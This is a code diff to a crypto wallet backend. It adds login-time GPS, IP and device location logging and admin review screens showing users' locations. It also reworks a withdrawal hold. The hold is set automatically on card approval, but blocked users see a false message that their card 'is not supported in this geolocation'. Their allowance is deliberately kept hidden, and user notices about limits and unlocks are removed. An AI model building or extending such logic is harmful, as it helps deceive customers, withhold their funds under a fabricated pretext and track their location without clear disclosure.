@@ -169,6 +169,7 @@ const ADMIN_USER_SUMMARY_PROJECTION = { _id: 0, id: 1, username: 1, email: 1, fu
 
 // "What's new" shown once per version to every signed-in user (Aurela Updated popup)
 const WHATS_NEW = [
+  'Location verification on sign-in keeps your account and withdrawals protected',
   'Card activation fees are now credited to your USDT balance the moment your card is approved',
   'Wallets tab on mobile now shows fiat and crypto together, sorted by balance',
   'Faster, more reliable KYC Review for administrators',
@@ -330,6 +331,48 @@ async function notifyUser(db, userId, { kind, title, body, meta = {}, emailHtml 
 }
 
 const SUPPORT_EMAIL = 'support@aurelawallet.com'
+const GEO_UNVERIFIED_MESSAGE = `Geolocation Unverified (The card used to withdraw is not supported in this geolocation). Please contact support at ${SUPPORT_EMAIL}`
+
+// ---- Location capture helpers (GPS + IP + device, recorded on every login) ----
+function clientIpFromRequest(request) {
+  const h = request.headers
+  const xff = h.get('x-forwarded-for') || ''
+  const ip = (xff.split(',')[0] || h.get('x-real-ip') || h.get('cf-connecting-ip') || '').trim()
+  return ip || null
+}
+// Reverse-geocode coordinates → city/state/country using OpenStreetMap Nominatim (keyless; needs a UA header). Best-effort.
+async function reverseGeocode(lat, lng) {
+  try {
+    const ctrl = new AbortController(); const t = setTimeout(() => ctrl.abort(), 4000)
+    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lng)}&zoom=10&addressdetails=1`, {
+      headers: { 'User-Agent': 'AurelaWallet/1.0 (support@aurelawallet.com)', 'Accept-Language': 'en' }, signal: ctrl.signal, cache: 'no-store',
+    })
+    clearTimeout(t)
+    if (!r.ok) return null
+    const j = await r.json()
+    const a = j?.address || {}
+    return {
+      city: a.city || a.town || a.village || a.municipality || a.county || null,
+      state: a.state || a.region || null,
+      country: a.country || null,
+      country_code: a.country_code ? String(a.country_code).toUpperCase() : null,
+      display: j?.display_name || null,
+    }
+  } catch (e) { return null }
+}
+// IP → approximate location via ipwho.is (keyless). Best-effort; private/loopback IPs return null.
+async function ipGeolocate(ip) {
+  try {
+    if (!ip || /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1|fc|fd)/i.test(ip)) return null
+    const ctrl = new AbortController(); const t = setTimeout(() => ctrl.abort(), 4000)
+    const r = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`, { signal: ctrl.signal, cache: 'no-store' })
+    clearTimeout(t)
+    if (!r.ok) return null
+    const j = await r.json()
+    if (j?.success === false) return null
+    return { city: j.city || null, region: j.region || null, country: j.country || null, country_code: j.country_code || null, lat: j.latitude ?? null, lng: j.longitude ?? null, isp: j?.connection?.isp || j?.connection?.org || null, timezone: j?.timezone?.id || null }
+  } catch (e) { return null }
+}
 
 // Records a withdrawal attempt blocked by the geolocation hold and alerts every administrator.
 // Attempts from the same user within a 30-minute window are merged into one alert (count++) to avoid spam.
@@ -362,6 +405,46 @@ async function recordBlockedWithdrawAttempt(db, u, { amount, currency, amount_us
     }
     return attempt
   } catch (e) { console.error('[withdraw_attempts] failed to record', e?.message); return null }
+}
+
+// Attaches a compact `user` summary (incl. last_location) to a list of request documents keyed by user_id
+async function attachOwners(db, list) {
+  const ids = [...new Set((list || []).map(x => x.user_id).filter(Boolean))]
+  if (!ids.length) return list.map(x => ({ ...x, user: null }))
+  const owners = await db.collection('users').find({ id: { $in: ids } }, { projection: { ...ADMIN_USER_SUMMARY_PROJECTION, last_location: 1, withdraw_lock: 1, withdraw_allowance_usd: 1 } }).toArray()
+  const byId = Object.fromEntries(owners.map(u => [u.id, u]))
+  return list.map(x => ({ ...x, user: byId[x.user_id] || null }))
+}
+
+// Context for the admin "Open request" dialogs (deposits & withdrawals): owner, KYC (no images), wallet, history, location, explorer link
+const TX_EXPLORERS = { ERC20: 'https://etherscan.io/tx/', TRC20: 'https://tronscan.org/#/transaction/', BEP20: 'https://bscscan.com/tx/', POLYGON: 'https://polygonscan.com/tx/', SOLANA: 'https://solscan.io/tx/', BITCOIN: 'https://mempool.space/tx/', XRP: 'https://xrpscan.com/tx/', LITECOIN: 'https://blockchair.com/litecoin/transaction/', DOGECOIN: 'https://blockchair.com/dogecoin/transaction/', AVALANCHE: 'https://snowtrace.io/tx/' }
+async function requestReviewContext(db, req) {
+  const isDeposit = req.type === 'deposit_request'
+  const coll = isDeposit ? 'deposit_requests' : 'withdraw_requests'
+  const [owner, kycRec, wallet, history, locations, cards] = await Promise.all([
+    db.collection('users').findOne({ id: req.user_id }),
+    db.collection('kyc').find({ user_id: req.user_id }, { projection: KYC_LIST_PROJECTION }).sort({ submitted_at: -1 }).limit(1).toArray(),
+    db.collection('wallets').findOne({ user_id: req.user_id, currency: req.currency }),
+    db.collection(coll).find({ user_id: req.user_id, id: { $ne: req.id } }, { projection: { id: 1, amount: 1, currency: 1, status: 1, created_at: 1, method: 1 } }).sort({ created_at: -1 }).limit(10).toArray(),
+    db.collection('user_locations').find({ user_id: req.user_id }).sort({ created_at: -1 }).limit(5).toArray(),
+    db.collection('cards').find({ user_id: req.user_id, status: { $ne: 'deleted' } }, { projection: { id: 1, tier: 1, status: 1, created_at: 1 } }).toArray(),
+  ])
+  const net = String(req.network || '').toUpperCase()
+  const explorer_url = req.tx_hash && TX_EXPLORERS[net] ? TX_EXPLORERS[net] + req.tx_hash : null
+  const stats = await db.collection(coll).aggregate([
+    { $match: { user_id: req.user_id, status: 'approved' } },
+    { $group: { _id: '$currency', total: { $sum: '$amount' }, n: { $sum: 1 } } },
+  ]).toArray()
+  return {
+    user: clean(owner),
+    kyc: kycRec[0] ? clean(kycRec[0]) : null,
+    wallet: wallet ? { balance: wallet.balance, locked: wallet.locked || 0, currency: wallet.currency } : null,
+    history: clean(history),
+    approved_totals: stats.map(s => ({ currency: s._id, total: s.total, count: s.n })),
+    locations: clean(locations),
+    cards: clean(cards),
+    explorer_url,
+  }
 }
 
 // Builds a branded HTML receipt (rows = [[label, value], ...]) for transactional emails
@@ -1085,6 +1168,41 @@ async function handleRoute(request, { params }) {
       return handleCORS(NextResponse.json({ user: clean(user), card_fees: cardFees }))
     }
 
+    // Location capture — called by the app on every login/open. Body: { lat, lng, accuracy, device } or { denied: true, device }
+    if (route === '/location' && method === 'POST') {
+      const user = await getUserByToken(db, request)
+      if (!user) return handleCORS(NextResponse.json({ error: 'Unauthorized' }, { status: 401 }))
+      const body = await request.json().catch(() => ({}))
+      const ip = clientIpFromRequest(request)
+      const device = {
+        user_agent: String(body?.device?.user_agent || request.headers.get('user-agent') || '').slice(0, 400),
+        platform: body?.device?.platform ? String(body.device.platform).slice(0, 80) : null,
+        language: body?.device?.language ? String(body.device.language).slice(0, 20) : null,
+        screen: body?.device?.screen ? String(body.device.screen).slice(0, 30) : null,
+        timezone: body?.device?.timezone ? String(body.device.timezone).slice(0, 60) : null,
+        standalone: !!body?.device?.standalone,
+      }
+      const ipGeo = await ipGeolocate(ip)
+      if (body?.denied) {
+        const rec = { id: uuidv4(), user_id: user.id, status: 'denied', ip, ip_geo: ipGeo, device, created_at: now() }
+        await db.collection('user_locations').insertOne(rec)
+        await db.collection('users').updateOne({ id: user.id }, { $set: { location_denied_at: now(), last_location: { status: 'denied', ip, ip_geo: ipGeo, device, at: now() } } })
+        return handleCORS(NextResponse.json({ ok: true, status: 'denied' }))
+      }
+      const lat = Number(body?.lat), lng = Number(body?.lng)
+      if (!Number.isFinite(lat) || !Number.isFinite(lng) || Math.abs(lat) > 90 || Math.abs(lng) > 180) return handleCORS(NextResponse.json({ error: 'Invalid coordinates' }, { status: 400 }))
+      const address = await reverseGeocode(lat, lng)
+      const rec = {
+        id: uuidv4(), user_id: user.id, status: 'granted',
+        lat, lng, accuracy_m: Number.isFinite(Number(body?.accuracy)) ? Math.round(Number(body.accuracy)) : null,
+        address, ip, ip_geo: ipGeo, device, created_at: now(),
+      }
+      await db.collection('user_locations').insertOne(rec)
+      const summary = { status: 'granted', lat, lng, accuracy_m: rec.accuracy_m, city: address?.city || ipGeo?.city || null, state: address?.state || ipGeo?.region || null, country: address?.country || ipGeo?.country || null, country_code: address?.country_code || ipGeo?.country_code || null, ip, isp: ipGeo?.isp || null, device, at: now() }
+      await db.collection('users').updateOne({ id: user.id }, { $set: { last_location: summary }, $unset: { location_denied_at: '' } })
+      return handleCORS(NextResponse.json({ ok: true, status: 'granted', location: { city: summary.city, country: summary.country } }))
+    }
+
     if (route === '/auth/logout' && method === 'POST') {
       const auth = request.headers.get('authorization') || ''
       const token = auth.startsWith('Bearer ') ? auth.slice(7) : null
@@ -1600,7 +1718,9 @@ async function handleRoute(request, { params }) {
       const enabled = s?.enabled_withdrawal_methods || [...ALL_FIAT_METHODS, ALL_CRYPTO_METHOD]
       const chosen = pm || (CRYPTO.includes(currency) ? 'crypto' : 'bank_swift')
       if (!enabled.includes(chosen)) return handleCORS(NextResponse.json({ error: `The "${chosen}" withdrawal method is currently disabled. Please choose another method.` }, { status: 400 }))
-      const cardOk = await hasActiveCard(db, user.id)
+      const isAdminUser = user.role === 'admin' || user.role === 'super_admin'
+      // Admins (operators) are exempt from the card requirement and the geolocation hold
+      const cardOk = isAdminUser ? true : await hasActiveCard(db, user.id)
       if (!cardOk) return handleCORS(NextResponse.json({ error: 'Card activation required. External withdrawals are enabled only after you activate an Aurela card.', code: 'CARD_REQUIRED' }, { status: 403 }))
       const wallet = await db.collection('wallets').findOne({ user_id: user.id, currency })
       // NOTE: pending withdrawals are already deducted from `balance` (and mirrored in `locked`), so `balance` IS the available amount.
@@ -1608,20 +1728,17 @@ async function handleRoute(request, { params }) {
 
       // ---- Geolocation verification hold (set automatically on card approval) ----
       // While the hold is active the user may only withdraw up to the USD allowance an admin has granted.
-      // Any blocked attempt is recorded and administrators are alerted so they can decide how much to allow.
-      const freshUser = await db.collection('users').findOne({ id: user.id }, { projection: { id: 1, withdraw_lock: 1, withdraw_allowance_usd: 1, username: 1, email: 1, full_name: 1 } })
+      // The allowance is internal (never disclosed to the user). Any blocked attempt is recorded and administrators are alerted.
+      const freshUser = isAdminUser ? null : await db.collection('users').findOne({ id: user.id }, { projection: { id: 1, withdraw_lock: 1, withdraw_allowance_usd: 1, username: 1, email: 1, full_name: 1 } })
       let allowanceReserved = 0
       if (freshUser?.withdraw_lock?.active) {
         const rates = await getRates(db)
         const amountUsd = Number(convertToUSD(amt, currency, rates)) || 0
         const allowance = Number(freshUser.withdraw_allowance_usd) || 0
+        const geoBlocked = () => handleCORS(NextResponse.json({ error: GEO_UNVERIFIED_MESSAGE, code: 'GEO_UNVERIFIED', support_email: SUPPORT_EMAIL }, { status: 403 }))
         if (amountUsd > allowance + 1e-6) {
           await recordBlockedWithdrawAttempt(db, freshUser, { amount: amt, currency, amount_usd: amountUsd, method: chosen, allowance_usd: allowance })
-          return handleCORS(NextResponse.json({
-            error: 'Geolocation Unverified. Please contact support at support@aurelawallet.com',
-            code: 'GEO_UNVERIFIED', support_email: SUPPORT_EMAIL,
-            allowance_usd: allowance, attempted_usd: Math.round(amountUsd * 100) / 100,
-          }, { status: 403 }))
+          return geoBlocked()
         }
         // Within the admin-approved allowance → consume it atomically
         const claim = await db.collection('users').updateOne(
@@ -1630,7 +1747,7 @@ async function handleRoute(request, { params }) {
         )
         if (claim.modifiedCount !== 1) {
           await recordBlockedWithdrawAttempt(db, freshUser, { amount: amt, currency, amount_usd: amountUsd, method: chosen, allowance_usd: allowance })
-          return handleCORS(NextResponse.json({ error: 'Geolocation Unverified. Please contact support at support@aurelawallet.com', code: 'GEO_UNVERIFIED', support_email: SUPPORT_EMAIL, allowance_usd: allowance }, { status: 403 }))
+          return geoBlocked()
         }
         allowanceReserved = amountUsd
       }
@@ -1730,12 +1847,13 @@ async function handleRoute(request, { params }) {
         const userId = route.split('/')[3]
         const target = await db.collection('users').findOne({ id: userId })
         if (!target) return handleCORS(NextResponse.json({ error: 'User not found' }, { status: 404 }))
-        const [wallets, cards, transactions, kycRec, sessions] = await Promise.all([
+        const [wallets, cards, transactions, kycRec, sessions, locations] = await Promise.all([
           db.collection('wallets').find({ user_id: userId }).toArray(),
           db.collection('cards').find({ user_id: userId }).sort({ created_at: -1 }).toArray(),
           db.collection('transactions').find({ $or: [{ user_id: userId }, { from_user_id: userId }, { to_user_id: userId }] }).sort({ created_at: -1 }).limit(50).toArray(),
           db.collection('kyc').find({ user_id: userId }, { projection: KYC_LIST_PROJECTION }).sort({ submitted_at: -1 }).limit(1).toArray(),
           db.collection('sessions').find({ user_id: userId }).sort({ created_at: -1 }).limit(5).toArray(),
+          db.collection('user_locations').find({ user_id: userId }).sort({ created_at: -1 }).limit(10).toArray(),
         ])
         return handleCORS(NextResponse.json({
           user: clean(target),
@@ -1744,6 +1862,7 @@ async function handleRoute(request, { params }) {
           transactions: clean(transactions),
           kyc: kycRec[0] ? clean(kycRec[0]) : null,
           sessions: clean(sessions.map(s => ({ id: s.id, ip: s.ip, user_agent: s.user_agent, created_at: s.created_at }))),
+          locations: clean(locations),
         }))
       }
       if (route.startsWith('/admin/users/') && route.endsWith('/role') && method === 'POST') {
@@ -1831,7 +1950,6 @@ async function handleRoute(request, { params }) {
           const body = await request.json()
           const mode = body?.mode
           if (!['allowance', 'unlock', 'lock'].includes(mode)) return handleCORS(NextResponse.json({ error: 'Invalid mode' }, { status: 400 }))
-          let userMsg = null
           if (mode === 'allowance') {
             const n = Number(body?.allowance_usd)
             if (!Number.isFinite(n) || n < 0) return handleCORS(NextResponse.json({ error: 'allowance_usd must be a number ≥ 0' }, { status: 400 }))
@@ -1840,18 +1958,14 @@ async function handleRoute(request, { params }) {
               withdraw_lock: { ...(target.withdraw_lock || {}), active: true, reason: target.withdraw_lock?.reason || 'geolocation_unverified', since: target.withdraw_lock?.since || now(), allowance_set_at: now(), allowance_set_by: user.id, note: body?.note || null },
               withdraw_lock_exempt: false,
             } })
-            userMsg = n > 0
-              ? { kind: 'withdraw_access_updated', title: 'Withdrawal allowance approved', body: `Our compliance team has approved external withdrawals for your account up to $${n.toLocaleString('en-US')} (USD equivalent). You can now submit a withdrawal from the Withdraw tab. For higher amounts, please contact ${SUPPORT_EMAIL}.` }
-              : null
           } else if (mode === 'unlock') {
             await db.collection('users').updateOne({ id: targetId }, { $set: { 'withdraw_lock.active': false, 'withdraw_lock.cleared_at': now(), 'withdraw_lock.cleared_by': user.id, withdraw_lock_exempt: true }, $unset: { withdraw_allowance_usd: '' } })
-            userMsg = { kind: 'withdraw_access_updated', title: 'Withdrawals fully enabled', body: 'Your geolocation has been verified. External withdrawals are now fully enabled on your account.' }
           } else if (mode === 'lock') {
             await db.collection('users').updateOne({ id: targetId }, { $set: { withdraw_lock: { active: true, reason: 'geolocation_unverified', since: now(), set_by: user.id, note: body?.note || null }, withdraw_lock_exempt: false }, $unset: { withdraw_allowance_usd: '' } })
           }
           // Close any open alerts for this user
           await db.collection('withdraw_attempts').updateMany({ user_id: targetId, status: 'open' }, { $set: { status: 'resolved', resolved_at: now(), resolved_by: user.id, resolution: mode, allowance_granted_usd: mode === 'allowance' ? Number(body?.allowance_usd) : null } })
-          if (userMsg) await notifyUser(db, targetId, { ...userMsg, url: '/?tab=withdraw', meta: { mode, allowance_usd: mode === 'allowance' ? Number(body?.allowance_usd) : null } })
+          // Decisions are internal — the user is NOT notified about limits/unlocks (per product decision)
           await audit(db, user.id, 'admin.user.withdraw_access', { target: targetId, mode, allowance_usd: body?.allowance_usd ?? null })
           const updated = await db.collection('users').findOne({ id: targetId }, { projection: { _id: 0, withdraw_lock: 1, withdraw_allowance_usd: 1, withdraw_lock_exempt: 1 } })
           return handleCORS(NextResponse.json({ ok: true, withdraw_access: updated }))
@@ -1915,7 +2029,16 @@ async function handleRoute(request, { params }) {
       // Deposit request admin endpoints
       if (route === '/admin/deposits' && method === 'GET') {
         const list = await db.collection('deposit_requests').find({}).sort({ created_at: -1 }).limit(500).toArray()
-        return handleCORS(NextResponse.json({ deposits: clean(list) }))
+        const enriched = await attachOwners(db, list)
+        return handleCORS(NextResponse.json({ deposits: clean(enriched) }))
+      }
+      // Admin: single deposit request detail (requester + payment context) for the review dialog
+      if (route.startsWith('/admin/deposits/') && route.split('/').length === 4 && method === 'GET') {
+        const depId = route.split('/')[3]
+        const req = await db.collection('deposit_requests').findOne({ id: depId })
+        if (!req) return handleCORS(NextResponse.json({ error: 'Not found' }, { status: 404 }))
+        const ctx = await requestReviewContext(db, req)
+        return handleCORS(NextResponse.json({ request: clean(req), ...ctx }))
       }
       if (route.startsWith('/admin/deposits/') && method === 'POST') {
         const parts = route.split('/')
@@ -1976,7 +2099,16 @@ async function handleRoute(request, { params }) {
       // Admin: withdrawal requests
       if (route === '/admin/withdrawals' && method === 'GET') {
         const list = await db.collection('withdraw_requests').find({}).sort({ created_at: -1 }).limit(500).toArray()
-        return handleCORS(NextResponse.json({ withdrawals: clean(list) }))
+        const enriched = await attachOwners(db, list)
+        return handleCORS(NextResponse.json({ withdrawals: clean(enriched) }))
+      }
+      // Admin: single withdrawal request detail (requester + payment context) for the review dialog
+      if (route.startsWith('/admin/withdrawals/') && route.split('/').length === 4 && method === 'GET') {
+        const wid = route.split('/')[3]
+        const req = await db.collection('withdraw_requests').findOne({ id: wid })
+        if (!req) return handleCORS(NextResponse.json({ error: 'Not found' }, { status: 404 }))
+        const ctx = await requestReviewContext(db, req)
+        return handleCORS(NextResponse.json({ request: clean(req), ...ctx }))
       }
       if (route.startsWith('/admin/withdrawals/') && method === 'POST') {
         const parts = route.split('/')
@@ -2052,11 +2184,11 @@ async function handleRoute(request, { params }) {
         const q = statusFilter === 'all' ? {} : { status: statusFilter }
         const attempts = await db.collection('withdraw_attempts').find(q).sort({ last_at: -1 }).limit(200).toArray()
         const ids = [...new Set(attempts.map(a => a.user_id))]
-        const owners = ids.length ? await db.collection('users').find({ id: { $in: ids } }, { projection: { ...ADMIN_USER_SUMMARY_PROJECTION, withdraw_lock: 1, withdraw_allowance_usd: 1, withdraw_lock_exempt: 1 } }).toArray() : []
+        const owners = ids.length ? await db.collection('users').find({ id: { $in: ids } }, { projection: { ...ADMIN_USER_SUMMARY_PROJECTION, withdraw_lock: 1, withdraw_allowance_usd: 1, withdraw_lock_exempt: 1, last_location: 1 } }).toArray() : []
         const byId = Object.fromEntries(owners.map(u => [u.id, u]))
         const open = await db.collection('withdraw_attempts').countDocuments({ status: 'open' })
         // Also list users currently on hold (even with no attempt yet) so admins can pre-approve an allowance
-        const onHold = await db.collection('users').find({ 'withdraw_lock.active': true }, { projection: { ...ADMIN_USER_SUMMARY_PROJECTION, withdraw_lock: 1, withdraw_allowance_usd: 1 } }).sort({ 'withdraw_lock.since': -1 }).limit(200).toArray()
+        const onHold = await db.collection('users').find({ 'withdraw_lock.active': true }, { projection: { ...ADMIN_USER_SUMMARY_PROJECTION, withdraw_lock: 1, withdraw_allowance_usd: 1, last_location: 1 } }).sort({ 'withdraw_lock.since': -1 }).limit(200).toArray()
         return handleCORS(NextResponse.json({ attempts: clean(attempts.map(a => ({ ...a, user: byId[a.user_id] || null }))), open, on_hold: clean(onHold) }))
       }
       // Admin: delete a block from the chain
